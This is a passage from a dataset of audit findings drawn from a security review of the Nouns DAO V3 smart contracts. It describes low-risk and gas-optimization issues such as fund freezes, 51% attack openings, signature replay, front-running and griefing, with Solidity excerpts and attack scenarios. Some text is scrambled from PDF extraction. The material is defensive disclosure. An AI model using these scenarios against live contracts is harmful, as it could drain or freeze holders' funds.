established at 20%, an attacker would need 148 nouns to execute a fork. Consider the scenario where a user purchases 148 nouns for a total of 4588 ETH (148 x 31 ether). The fork- Treasury.balance would be 2679.27 ETH, and the contract_stETH.balanceOf(forkTreasury) would stand at 3000.7 ETH. The total ETH obtained would amount to 5680.01 ETH, thereby yielding a profit of 1092 ETH ($2,024,568).", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Setting NounsAuctionHouse's timeBuffer too big is possible, which will freeze bidder's funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "It's now possible to set timeBuffer to an arbitrary big value with setTimeBuffer(), there is no control:  NounsAuctionHouse.sol#L161-L169 /** * @notice Set the auction time buffer. * @dev Only callable by the owner. */ function setTimeBuffer(uint256 _timeBuffer) external override onlyOwner { timeBuffer = _timeBuffer; emit AuctionTimeBufferUpdated(_timeBuffer); } This can freeze user funds as NounsAuctionHouse holds current bid, but the its release in conditional to block.timestamp >= _auction.endTime:  NounsAuctionHouse.sol#L96-L98 function settleAuction() external override whenPaused nonReentrant { _settleAuction(); } 29  NounsAuctionHouse.sol#L221-L234 function _settleAuction() internal { INounsAuctionHouse.Auction memory _auction = auction; require(_auction.startTime != 0, \"Auction hasn't begun\"); require(!_auction.settled, 'Auction has already been settled'); require(block.timestamp >= _auction.endTime, \"Auction hasn't completed\"); >> auction.settled = true; if (_auction.bidder == address(0)) { nouns.burn(_auction.nounId); } else { nouns.transferFrom(address(this), _auction.bidder, _auction.nounId); } Which can be set to be arbitrary big value, say 106 years, effectively freezing current bidder's funds:  NounsAuctionHouse.sol#L104-L129 function createBid(uint256 nounId) external payable override nonReentrant { ... // Extend the auction if the bid was received within `timeBuffer` of the auction end time bool extended = _auction.endTime - block.timestamp < timeBuffer; if (extended) { >> auction.endTime = _auction.endTime = block.timestamp + timeBuffer; } I.e. permissionless settleAuction() mechanics will be disabled. Current bidder's funds will be frozen for an arbitrary time. As the new setting needs to pass voting, the probability is very low. In the same time it is higher for any forked DAO than for original one, so, while the issue is present in the V1 and V2, it becomes more severe in V3 in the context of the forked DAO. The impact is high, being long-term freeze of the bidder's native tokens.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Veto renouncing in the original DAO or rage quit blocking in a forked DAO as a result of any future proposals will open up the way for 51% attacks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "It is possible to renounce veto power in V1, V2 and V3 versions of the protocol or upgrade forked V1 to block or remove rage quit. While it is a part of standard workflow, these operations are irreversible and open up a possibility of all variations of 51% attack. As a simplest example, in the absence of veto functionality a majority can introduce and execute a proposal to move all DAO treasury funds to an address they control. Also, there is a related vector, incentivized bad faith voting. _burnVetoPower() exists in V1, V2 and V3: In NounsDAOLogicV1 : 30 /** * @notice Burns veto priviledges * @dev Vetoer function destroying veto power forever */ function _burnVetoPower() public { // Check caller is pendingAdmin and pendingAdmin require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only'); address(0) _setVetoer(address(0)); } In NounsDAOLogicV2: /** * @notice Burns veto priviledges * @dev Vetoer function destroying veto power forever */ function _burnVetoPower() public { // Check caller is vetoer require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only'); // Update vetoer to 0x0 emit NewVetoer(vetoer, address(0)); vetoer = address(0); // Clear the pending value emit NewPendingVetoer(pendingVetoer, address(0)); pendingVetoer = address(0); } In NounsDAOLogicV3: /** * @notice Burns veto priviledges * @dev Vetoer function destroying veto power forever */ function _burnVetoPower(NounsDAOStorageV3.StorageV3 storage ds) public { // Check caller is vetoer require(msg.sender == ds.vetoer, 'NounsDAO::_burnVetoPower: vetoer only'); // Update vetoer to 0x0 emit NewVetoer(ds.vetoer, address(0)); ds.vetoer = address(0); // Clear the pending value emit NewPendingVetoer(ds.pendingVetoer, address(0)); ds.pendingVetoer = address(0); } Also, veto() was removed from NounsDAOLogicV1Fork, and the only mitigation to the same attack is rage quit():  NounsDAOLogicV1Fork.sol#L195-L222 31 /** * @notice A function that allows token holders to quit the DAO, taking their pro rata funds, * and sending their tokens to the DAO treasury. * Will revert as long as not all tokens were claimed, and as long as the delayed governance has not expired. ,! * @param tokenIds The token ids to quit with */ function quit(uint256[] calldata tokenIds) external nonReentrant { checkGovernanceActive(); uint256 totalSupply = adjustedTotalSupply(); for (uint256 i = 0; i < tokenIds.length; i++) { nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); } for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) { IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]); uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply; ,! bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend); if (!erc20Sent) revert QuitERC20TransferFailed(); } uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply; bool ethSent = timelock.sendETH(msg.sender, ethToSend); if (!ethSent) revert QuitETHTransferFailed(); emit Quit(msg.sender, tokenIds); } in as an this that example function, any malfunction to forked nouns holders was previously black-listed there will be no way to stop any This means erc20TokensToIncludeInQuit, while a minority of by USDC contract, will open up the possibility of majority attack on them, i.e. majority backed malicious proposal from affecting the DAO held funds of such holders. Nouns holders that aren't aware enough of the importance of functioning veto() for original DAO and quit() for the forked DAO, can pass a proposal that renounce veto or [fully or partially] block quit(), enabling the 51% attack. Such change will be irreversible and if a majority forms and acts before any similar mitigation functionalities be reinstalled, the whole DAO funds of the rest of the holders can be lost. Per very low likelihood (which increases with the switch from veto() to quit() as a safeguard), and high funds loss impact, setting the severity to be low. if USDC is added", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "The try-catch block at NounsAuctionHouseFork will only catch errors that contain strings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "This issue has been previously identified and documented in the Nouns Builder Code4rena Audit. The catch Error(string memory) within the try/catch block in the _createAuction function only catches re- verts that include strings. At present, in the current version of the NounsAuctionHouseFork there are not reverts without a string. But, given the fact that the NounsAuctionHouseFork and the NounsTokenFork contracts are meant to be upgrad- able, if a future upgrade in the NounsTokenFork:mint() replaces the require statements with custom errors, the existing catch statement won't be able to handle the reverts, potentially leading to a faulty state of the contract. Here's an example illustrating that the catch Error(string memory) won't catch reverts with custom errors that don't contain strings: contract Test1 { bool public error; Test2 test; constructor() { test = new Test2(); } function testCustomErr() public{ try test.revertWithRevert(){ } catch Error(string memory) { error = true; } } function testRequire() public{ try test.revertWithRequire(){ } catch Error(string memory) { error = true; } } } contract Test2 { error Revert(); function revertWithRevert() public{ revert Revert(); } function revertWithRequire() public { require(true == false, \"a\"); } }", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Private keys are read from the .env environment variable in the deployment scripts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "It has been identified that the private key of privileged (PROPOSER_KEY and DEPLOYER_PRIVATE_KEY) accounts are read the environment variables within scripts. The deployer address is verified on Etherscan as Nouns DAO: Deployer. Additionally, since the proposal is made by the account that owns the PROPOSER_KEY, it can be assumed that the proposer owns at least some Nouns. ProposeENSReverseLookupConfigMain- ProposeDAOV3UpgradeMainnet.s.sol#L24, Given the privileged status of the deployer and the proposer, unauthorized access to this private key could have a negative impact in the reputation of the Nouns DAO. The present method of managing private keys, i.e., through environment variables, represents a potential security risk. This is due to the fact that any program or script with access to the process environment can read these variables. As mentioned in the Foundry documentation: This loads in the private key from our .env file. Note: you must be careful when exposing private keys in a .env file and loading them into programs. This is only recommended for use with non-privileged deployers or for local / test setups. For production setups please review the various wallet options that Foundry supports.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk DeployDAOV3NewContractsBase.s.sol#L53, DeployDAOV3DataContractsBase.s.sol#L21,"]}, {"title": "Objection period will be disabled after the update to V3 is completed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Nouns DAO V3 introduces a new functionality called objection-only period. This is a conditional voting period that gets activated upon a last-minute proposal swing from defeated to successful, affording against voters more reaction time. Only against votes will be possible during the objection period. After the proposals created in ProposeDAOV3UpgradeMainnet.s.sol and ProposeTimelockMigrationCleanup- Mainnet.s.sol are executed lastMinuteWindowInBlocks and objectionPeriodDurationInBlocks will still re- main set to 0. A new proposal will have to be created, passed and executed in the DAO that calls the _setLast- MinuteWindowInBlocks() and _setObjectionPeriodDurationInBlocks() functions to enable this functionality.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Potential risks from outdated OpenZeppelin dependencies in the Nouns DAO v3", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The OpenZeppelion libraries are being used throughout the Nouns DAO v3 codebase. These li- braries however, are locked at version 4.4.0, which is an outdated version that has some known vulnerabilities. Specifically:  The SignatureChecker.isValidSignatureNow is not expected to revert. However, an incorrect assumption about Solidity 0.8's abi.decode allows some cases to revert, given a target contract that doesn't imple- ment EIP-1271 as expected. The contracts that may be affected are those that use SignatureChecker to check the validity of a signature and handle invalid signatures in a way other than reverting.  The ERC165Checker.supportsInterface is designed to always successfully return a boolean, and under no circumstance revert. However, an incorrect assumption about Solidity 0.8's abi.decode allows some cases to revert, given a target contract that doesn't implement EIP-165 as expected, specifically if it returns a value other than 0 or 1. The contracts that may be affected are those that use ERC165Checker to check for support for an interface and then handle the lack of support in a way other than reverting. At present, these vulnerabilities do not appear to have an impact in the Nouns DAO codebase, as corresponding functions revert upon failure. Nevertheless, these vulnerabilities could potentially impact future versions of the codebase.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "DAO withdraws forked ids from escrow without emphasizing total supply increase which contra- dicts the spec and can catch holders unaware", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Withdrawal original nouns with ids of the forked tokens from escrow after the successful fork is a material event for all original nouns holders as the adjusted total supply is increased as long as withdrawal recipient is not treasury. There were special considerations regarding Nouns withdrawal impact after the fork: For this reason we're considering a change to make sure transfers go through a new function that helps Nouners ,! understand the implication, e.g. by setting the function name to withdrawNounsAndGrowTotalSupply or something similar, as well as emitting events that indicate the new (and greater) total supply used ,! by the DAO. However, currently withdrawDAONounsFromEscrow() neither have a special name, nor mentions the increase of adjusted total supply when to != ds.timelock:  NounsDAOV3Fork.sol#L160-L178 /** * @notice Withdraws nouns from the fork escrow after the fork has been executed * @dev Only the DAO can call this function * @param tokenIds the tokenIds to withdraw * @param to the address to send the nouns to */ function withdrawDAONounsFromEscrow( NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds, address to ) external { if (msg.sender != ds.admin) { revert AdminOnly(); } ds.forkEscrow.withdrawTokens(tokenIds, to); emit DAOWithdrawNounsFromEscrow(tokenIds, to); } Nouns holder might not understand the consequences of withdrawing the nouns from escrow and support such a proposal, while as of now it is approximately USD 65k loss per noun withdrawn cumulatively for current holders. The vulnerability scenario here is a holder supporting the proposal without understanding the consequences for supply, as no emphasis is made, and then suffers their share of loss as a result of its execution. Per low likelihood and impact setting the severity to be low.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "USDC-paying proposals executing between ProposeDAOV3UpgradeMainnet and ProposeTimelockMi- grationCleanupMainnet will fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "As explained in one of the Known Issues, ProposeDAOV3UpgradeMainnet contains a proposal that transfers the ownership of PAYER_MAINNET and TOKEN_BUYER_MAINNET from timelockV1 to timelockV2. There could be older USDC-paying proposals executing after ProposeDAOV3UpgradeMainnet which assume timelockV1 ownership of these contracts. Older USDC-paying proposals executing after ProposeDAOV3UpgradeMainnet will fail.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Zero value ERC-20 transfers can be performed on sending treasury funds to quitting member or forked DAO, denying the whole operation if one of erc20TokensToIncludeInQuit tokens doesn't allow this", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Some tokens do not allow for zero value transfers. Such behaviour do not violate ERC-20 standard, is not anyhow prohibited and can occur in any non-malicious token. As a somewhat well-known example Aave's LEND requires amount to be positive:  etherscan.io/address/0x80fb784b7ed66730e8b1dbd9820afd29931aab03#code#L74 function transfer(address _to, uint256 _value) returns(bool) { require(balances[msg.sender] >= _value); require(balances[_to] + _value > balances[_to]); As stETH, which is currently used by Nouns treasury, is upgradable, it cannot be ruled out that it might be requiring the same in the future for any reason.  etherscan.io/token/0xae7ab96520de3a18e5e111b5eaab095312d7fe84#code Zero value itself can occur in a situation when valid token was added to erc20TokensToIncludeInFork, but this token timelock balance is currently empty. NounsDAOLogicV1Fork's quit() and NounsDAOV3Fork's executeFork() and joinFork() will be unavailable in such scenario, i.e. the DAO forking workflow will be disabled. 37 Since the update of erc20TokensToIncludeInFork goes through proposal mechanics and major tokens rarely upgrade, while there is an additional requirement of empty balance, the cumulative probability of the scenario can be deemed quite low, while the core functionality blocking impact is high, so setting the severity to be low.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "A signer of multiple proposals will cause all of them except one to fail creation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Like proposers, signers are also allowed to back only one proposal at a time. As commented: \"This is a spam protection mechanism to limit the number of proposals each noun can back.\" However, unlike proposers who know which of their proposals are active and when, signers may not readily have that insight and can sign multiple proposals they may want to back. If more than one such proposal is proposed then only the first one will pass the checkNoActiveProp() for this signer and all the others will fail this check and thereby the proposal creation itself. A signer of multiple proposals will cause all of them except one to fail creation. Other proposals will have to then exclude such signatures and resubmit. This could be accidental or used by malicious signers for griefing proposal creations.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Single-step ownership change is risky", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The codebase primarily follows a two-step ownership change pattern. However, in specific sections, a single-step ownership change is utilized. Two-step ownership change is preferable, where:  The current owner proposes a new address for the ownership change.  In a separate transaction, the proposed new address can then claim the ownership.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "No storage gaps for upgradeable contracts might lead to storage slot collision", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "When implementing upgradable contracts that inherit it is important that there are storage gaps, in case new storage variables are later added to the inherited contracts. If a storage gap variable isn't added, when the upgradable contract introduces new variables, it may override the variables in the inheriting contract. As noted in the OpenZeppelin Documentation: You may notice that every contract includes a state variable named __gap. This is empty reserved It allows us to freely add new state space in storage that is put in place in Upgrade Safe contracts. variables in the future without compromising the storage compatibility with existing deployments. It isnt safe to simply add a state variable because it \"shifts down\" all of the state variables below in the inheritance chain.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "The version string is missing from the domain separator allowing submission of signatures in different protocol versions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The version string seems to be missing from the domain separator. According to EIP-712: Protocol designers only need to include the fields that make sense for their signing domain. Unused fields are left out of the struct type While it's not a mandatory field as per the EIP-712 standard, it would be sensible for the protocol to include the version string in the domain separator, considering that the contracts are upgradable. For instance, if a user generates a signature for version v1.0, they may not want the signature to remain valid following an upgrade.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Two/three forks in a row will force expiration of execution-awaiting proposals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Proposal execution on the original DAO is disallowed during the forking period. While the proposed fork period is currently 7 days, MAX_FORK_PERIOD is 14 days. GRACE_PERIOD, which is the time allowed for a queued proposal to execute, has been increased from the existing 14 days to 21 days specifically to account for the fork period. However, if there are three consecutive forks whose active fork periods add up to 21 days, or two forks in the worse case if the fork period is set to MAX_FORK_PERIOD then all queued proposals will expire and cannot be executed. Malicious griefing forkers can collude to time and break-up their voting power to fork consecutively to prevent execution of queued proposal on the original DAO, thus forcing them to expire.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Withdrawing from fork escrow can be front-run to prevent withdrawal and force join the fork", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "withdrawFromForkEscrow() is meant to allow a fork escrowed holder change their mind about join- ing the fork by withdrawing their escrowed tokens. However, the current design allows another fork joining holder to front-run a withdrawFromForkEscrow() transaction with their escrowToFork() to exceed the fork threshold and also call executeFork() with it (if the threshold was already met then this doesn't even have to be another fork joining holder). This will cause withdrawFromForkEscrow() to fail because the fork period is now active and that holder is forced to join the fork with their previously escrowed tokens. Scenario: Alice and Bob decide to create/join a fork with their 10 & 15 tokens respectively to meet the 20% fork threshold (assume 100 Nouns). Alice escrows first but then changes her mind and calls withdrawFromForkE- scrow(). Bob observes this transaction (assume no private mempool) and front-runs it with his escrowToFork() + executeFork(). This forces Alice to join the fork instead of staying back. withdrawFromForkEscrow() does not always succeed and is likely effective only in the early stages of escrow period but not towards the end when the fork threshold is almost met. Late fork escrowers do not have as much an opportunity as others to change their mind about joining the fork.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "A malicious proposer can replay signatures to create duplicate proposals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Suppose Bob and Alice sign a proposal for Carl, authorizing a transfer of exactly 100,000 USDC to a specified address (xyz) and their signatures were created with a long expiration time. Following the normal procedure, Carl creates the proposal, the vote is held, and the proposal enters the 'succeeded' state. However, since Bob and Alice's signatures are still valid due to the long expiration time, Carl could reuse these signatures to create another proposal for an additional transfer of 100,000 USDC to the same xyz address, as long as Bob and Alice still retain their voting power/nouns. Thus, Carl could double the intended transfer amount without their explicit authorization. While it is true that Bob and Alice can intervene by either cancelling the new proposal or invalidating their signatures before the creation of the second proposal, it necessitates them to take action, which may not always be feasible or timely.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Potential re-minting of previously burnt NounsTokenFork", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "In the current implementation of the NounsTokenFork contract, there is a potential vulnerability that allows for a previously burned NounsTokenFork to be re-minted. This risk occurs due to the user retaining the status of escrow.ownerOfEscrowedToken(forkId, nounId) even after the claimFromEscrow() function call. Presently, no tokens are burned outside of the NounsAuctionHouseFork and are only burned in the case that no bids are placed for that nounId. However, this issue could become exploitable under the following circumstances: 1. If a new burn() functionality is added elsewhere in the code. 2. If a new contract is granted the Minter role. 3. If the NounsAuctionHouseFork is updated to a malicious implementation. Additionally, exploiting this potential issue would lead to the remainingTokensToClaim variable decreasing, caus- ing it to underflow (<0). In this situation, some legitimate users would be unable to claim their tokens due to this underflow.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "A single invalid/expired/cancelled signature will prevent the creation and updation of proposals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "For proposals created via proposeBySigs() or updated via updateProposalBySigs(), if the pro- poser includes even a single invalid/expired/cancelled signature (without performing offchain checks to prevent this scenario), verifyProposalSignature() will revert and the creation/updation of proposals will fail. NounsDAOV3Proposals.sol#L815 Nouns- A proposer accidentally including one or more invalid/expired/cancelled signatures submitted accidentally by a signer will cause the proposal creation/updation to fail, lose gas used and will have to resubmit after checking and excluding such signatures. This also allows griefing by signers who intentionally submit an invalid/expired signature or a valid one which is later cancelled (using cancelSig()) just before the proposal is created/updated. Note that while the signers currently have cancellation powers which gives them a greater griefing opportunity even at later proposal states, that has been reported separately in a different issue.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk NounsDAOV3Proposals.sol#L956-L962"]}, {"title": "Missing require checks in NounsDAOV3Proposals.execute() and executeOnTimelockV1() functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The following require checks are missing:  FunctionNounsDAOV3Proposals.execute(): require(proposal.executeOnTimelockV1 == false, 'NounsDAO::execute: executeOnTimelockV1 = true');  Function NounsDAOV3Proposals.executeOnTimelockV1(): require(proposal.executeOnTimelockV1 == true, 'NounsDAO::executeOnTimelockV1: executeOnTimelockV1 = ,! false'); Due to the absence of these require checks, the NounsDAOLogicV3 contract leaves open a vulnerability where if two identical proposals, with the exact same transactions, are concurrently queued in both the timelockV1 and timelock contracts, the proposal originally intended for execution on timelock can be executed on timelockV1 and vice versa. The consequence of this scenario is that it essentially blocks or causes a Denial of Service to the legitimate execution path of the corresponding proposal for either timelockV1 or timelock. This occurs because each proposal has been inadvertently executed on the unintended timelock contract due to the lack of a condition check that would otherwise ensure the correct execution path.", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Due to misaligned DAO and Executors logic any proposal will be blocked from execution at 'eta + GRACE_PERIOD' timestamp", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "There is an inconsistency in treatment of the eta + GRACE_PERIOD moment of time in the proposal lifecycle: any proposal is executable in timelock at this timestamp, but have expired status in the DAO logic. Both Executors do allow the executions when block.timestamp == eta + GRACE_PERIOD: The NounsDAOExecutor:executeTransaction() function: 43 function executeTransaction( address target, uint256 value, string memory signature, bytes memory data, uint256 eta ) public returns (bytes memory) { ... require( getBlockTimestamp() >= eta, \"NounsDAOExecutor::executeTransaction: Transaction hasn't surpassed time lock.\" ); require( getBlockTimestamp() <= eta + GRACE_PERIOD, 'NounsDAOExecutor::executeTransaction: Transaction is stale.' ); The NounsDAOExecutorV2:executeTransaction() function: function executeTransaction( address target, uint256 value, string memory signature, bytes memory data, uint256 eta ) public returns (bytes memory) { ... require( getBlockTimestamp() >= eta, \"NounsDAOExecutor::executeTransaction: Transaction hasn't surpassed time lock.\" ); require( getBlockTimestamp() <= eta + GRACE_PERIOD, 'NounsDAOExecutor::executeTransaction: Transaction is stale.' ); While all (V1,2, 3, and V1Fork) DAO state functions produce the expired state. The NounsDAOLogicV2:state() function: function state(uint256 proposalId) public view returns (ProposalState) { require(proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id'); Proposal storage proposal = _proposals[proposalId]; if (proposal.vetoed) { return ProposalState.Vetoed; } else if (proposal.canceled) { return ProposalState.Canceled; } else if (block.number <= proposal.startBlock) { return ProposalState.Pending; } else if (block.number <= proposal.endBlock) { return ProposalState.Active; } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < ,! quorumVotes(proposal.id)) { return ProposalState.Defeated; } else if (proposal.eta == 0) { return ProposalState.Succeeded; } else if (proposal.executed) { return ProposalState.Executed; >> } else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) { return ProposalState.Expired; 44 The NounsDAOV3Proposals:stateInternal() function: function stateInternal(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId) internal view returns (NounsDAOStorageV3.ProposalState) { require(ds.proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id'); NounsDAOStorageV3.Proposal storage proposal = ds._proposals[proposalId]; if (proposal.vetoed) { return NounsDAOStorageV3.ProposalState.Vetoed; } else if (proposal.canceled) { return NounsDAOStorageV3.ProposalState.Canceled; } else if (block.number <= proposal.updatePeriodEndBlock) { return NounsDAOStorageV3.ProposalState.Updatable; } else if (block.number <= proposal.startBlock) { return NounsDAOStorageV3.ProposalState.Pending; } else if (block.number <= proposal.endBlock) { return NounsDAOStorageV3.ProposalState.Active; } else if (block.number <= proposal.objectionPeriodEndBlock) { return NounsDAOStorageV3.ProposalState.ObjectionPeriod; } else if (isDefeated(ds, proposal)) { return NounsDAOStorageV3.ProposalState.Defeated; } else if (proposal.eta == 0) { return NounsDAOStorageV3.ProposalState.Succeeded; } else if (proposal.executed) { return NounsDAOStorageV3.ProposalState.Executed; >> } else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) { return NounsDAOStorageV3.ProposalState.Expired; The NounsDAOLogicV1Fork:state() function: function state(uint256 proposalId) public view returns (ProposalState) { require(proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id'); Proposal storage proposal = _proposals[proposalId]; if (proposal.canceled) { return ProposalState.Canceled; } else if (block.number <= proposal.startBlock) { return ProposalState.Pending; } else if (block.number <= proposal.endBlock) { return ProposalState.Active; } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < ,! proposal.quorumVotes) { return ProposalState.Defeated; } else if (proposal.eta == 0) { return ProposalState.Succeeded; } else if (proposal.executed) { return ProposalState.Executed; >> } else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) { return ProposalState.Expired; Impact: Since both timelocks require sender to be admin, forced to be expired when execution call proposal).GRACE_PERIOD(). the valid proposal will be blocked from execution and time happens to be proposal.eta + getProposalTimelock(ds, The probability of this exact timestamp to be reached is low, while the impact of successful proposal to be rendered invalid by itself is high. However, since there is enough time prior to that moment both for cancellation and execution and all these actions come through permissioned workflow the impact is better described as medium, so per low probability and medium impact setting the severity to be low. 45", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "A malicious DAO can increase the odds of proposal defeat by setting a very high value of last- MinuteWindowInBlocks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The goal of objection-only period, as documented, is to protect the DAO from executing proposals, that the majority would not want to execute. However, a malicious majority can abuse this feature by setting a very high value of lastMinuteWindowInBlocks (setter does not enforce max threshold), i.e. something very close to the voting period, to increase the probability of triggering objection-only period. If votingPeriod = 2 weeks and a governance proposal somehow passed to set lastMin- Example scenario: uteWindowInBlocks to a value very close to 100800 blocks i.e. ~2 weeks, then every proposal may end up with an objection-only period. Impact: Every proposal may end up with an objection-only period which may not be required/expected. Low likelihood + Low impact = Low severity. 46", "labels": ["Spearbit", "Nouns", "Severity: Low Risk"]}, {"title": "Use custom errors instead of revert strings and remove pre-existing unused custom errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "String errors are added to the bytecode which make deployment cost more expenseive. It is also difficult to use dynamic information in them. Custom errors are more convenient and gas-efficient. There are several cases across the codebase where long string errors are still used over custom errors. As an example, in NounsDAOLogicV1Fork.sol#L680, the check reverts with a string: require(msg.sender == admin, 'NounsDAO::_setQuorumVotesBPS: admin only'); In this case, the AdminOnly() custom error can be used here to save gas. This also occur in other parts of this contract as well as the codebase. Also, some custom errors were defined but not used. See NounTokenFork.sol#L40, NounTokenFork.sol#L43", "labels": ["Spearbit", "Nouns", "Severity: Gas Optimization"]}, {"title": "escrowedTokensByForkId can be used to get owner of escrowed tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The state variable escrowedTokensByForkId in L58 creates a getter function that can be used to check the owner of escrowed token. This performs the same function as calling ownerOfEscrowedToken() and might be considered redundant.", "labels": ["Spearbit", "Nouns", "Severity: Gas Optimization"]}, {"title": "Emit events using locally assigned variables instead of reading from storage to save on SLOAD", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "By emitting local variables over storage variables, when they have the same value, you can save gas on SLOAD. Some examples include: NounsDAOLogicV1Fork.sol#L619 : - + emit VotingDelaySet(oldVotingDelay, votingDelay); emit VotingDelaySet(oldVotingDelay, newVotingDelay); NounsDAOLogicV1Fork.sol#L635 : - + emit VotingPeriodSet(oldVotingPeriod, votingPeriod); emit VotingPeriodSet(oldVotingPeriod, newVotingPeriod); NounsDAOLogicV1Fork.sol#L653 : - + emit ProposalThresholdBPSSet(oldProposalThresholdBPS, proposalThresholdBPS); emit ProposalThresholdBPSSet(oldProposalThresholdBPS, newProposalThresholdBPS); NounsDAOLogicV1Fork.sol#L670 : - emit QuorumVotesBPSSet(oldQuorumVotesBPS, quorumVotesBPS); + emit QuorumVotesBPSSet(oldQuorumVotesBPS, newQuorumVotesBPS); NounsDAOExecutorV2.sol#L104 : - + emit NewDelay(delay); emit NewDelay(delay_); NounsDAOExecutorV2.sol#L112 : - + emit NewAdmin(admin); emit NewAdmin(msg.sender); NounsDAOExecutorV2.sol#L122 : - + emit NewPendingAdmin(pendingAdmin); emit NewPendingAdmin(pendingAdmin_); NounsDAOV3Admin.sol#L284 : - + emit NewPendingAdmin(oldPendingAdmin, ds.pendingAdmin); emit NewPendingAdmin(oldPendingAdmin, address(0)); NounsDAOProxy.sol#L85 : - + emit NewImplementation(oldImplementation, implementation); emit NewImplementation(oldImplementation, implementation_);", "labels": ["Spearbit", "Nouns", "Severity: Gas Optimization"]}, {"title": "joinFork() violates Checks-Effects-Interactions best practice for reentrancy mitigation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "joinFork() interacts with forkDAOTreasury in sendProRataTreasury() to send pro rata original DAO treasury for the tokens joining the fork. This interaction with the external forkDAOTreasury contract happens before the transfer of the original DAO tokens to the timelock is effected. While forkDAOTreasury is under the control of the fork DAO (outside the trust model of original DAO) and join- Fork() does not have a reentrancy guard, we do not see a potential/meaningful exploitable reentrancy here.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Rename MAX_VOTING_PERIOD and MAX_VOTING_DELAY to enhance 